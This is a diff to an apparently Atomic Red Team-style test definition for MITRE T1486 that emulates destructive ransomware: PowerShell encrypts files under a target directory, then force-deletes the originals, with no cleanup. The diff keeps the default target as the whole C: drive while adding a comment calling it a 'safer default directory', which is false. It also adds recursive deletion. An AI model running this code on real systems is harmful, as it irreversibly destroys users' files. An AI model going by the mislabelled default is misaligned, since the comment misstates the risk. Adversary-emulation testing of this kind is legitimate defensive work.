@@ -1,4 +1,3 @@
-
 attack_technique: T1486
 display_name: Data Encrypted for Impact (Destructive Version)
 atomic_tests:
@@ -17,7 +16,7 @@ atomic_tests:
       target_directory:
         description: Directory to encrypt and delete files from
         type: path
-        default: "C:\\"
+        default: "C:\\"  # Safer default directory
       target_extensions:
         description: List of file extensions to target for encryption
         type: array
@@ -128,10 +127,21 @@ atomic_tests:
             
             if ($LASTEXITCODE -eq 0) {
                 Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
-                
-                # Delete the original file after successful encryption
-                Remove-Item -Path $file -Force
-                Write-Host "🗑️ Deleted original file: $file"
+
+                # Verify that the encrypted file exists before deleting the original
+                if (Test-Path $encryptedFile) {
+                    Write-Host "✅ Encrypted file verified: $encryptedFile"
+
+                    # Delete the original file after successful encryption
+                    try {
+                        Remove-Item -Path $file -Recurse -Force
+                        Write-Host "🗑️ Deleted original file: $file"
+                    } catch {
+                        Write-Host "❌ Failed to delete file: $file"
+                    }
+                } else {
+                    Write-Host "❌ Encrypted file not found: $encryptedFile"
+                }
             } else {
                 Write-Host "❌ Failed to encrypt: $file"
             }
@@ -140,4 +150,4 @@ atomic_tests:
         Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
-        # Note: Ensure that the decryption password is securely stored and accessible
+        # Note: Ensure that the decryption password is securely stored and accessible.
